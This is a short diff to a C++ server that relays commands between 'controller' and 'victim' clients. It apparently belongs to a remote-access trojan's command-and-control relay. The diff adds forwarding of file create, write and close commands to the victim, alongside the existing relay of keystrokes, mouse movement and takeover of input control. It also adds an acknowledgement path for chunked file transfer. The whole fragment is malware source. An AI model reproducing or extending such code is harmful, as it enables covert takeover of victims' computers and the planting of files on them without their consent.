@@ -144,8 +144,8 @@ void Server::processControllerMsg(sf::Uint8 id, sf::Packet p)
 		updateControllersList();
 	}
 	//forward events to victim
-	else if (cmd == 'm' || cmd == 'n' || cmd == 'l' || cmd == 'k' ||
-		cmd == 'a' || cmd == 'z' || cmd == 's' || cmd == 'x') {
+	//key-pressed, key-released, mouse moved, wheel scrolled, start-stop keyboard controll, start-stop mouse control, create-write-close file
+	else if (cmd == 'm' || cmd == 'n' || cmd == 'l' || cmd == 'k' || cmd == 'a' || cmd == 'z' || cmd == 's' || cmd == 'x' || cmd == 'f' || cmd == 'o' || cmd == 'i') {
 
 		//controller is not paired
 		if (clients[id].pair == 0)
@@ -232,8 +232,16 @@ void Server::processVictimMsg(sf::Uint8 id, sf::Packet p)
 	sf::Uint8 cmd;
 	p >> cmd;
 
+	//tell controller that it can receive next file packet
+	if (cmd == 'y') {
+		//victim is not paired
+		if (clients[id].pair == 0)
+			return;
+
+		clients[clients[id].pair].socket->send(p);
+	}
 	//apparently victim thinks it isn't initialized
-	if (cmd == 'c' || cmd == 'v') {
+	else if (cmd == 'c' || cmd == 'v') {
 		//reset controller's role and name
 		clients[id].role = '-';
 		clients[id].name = "";
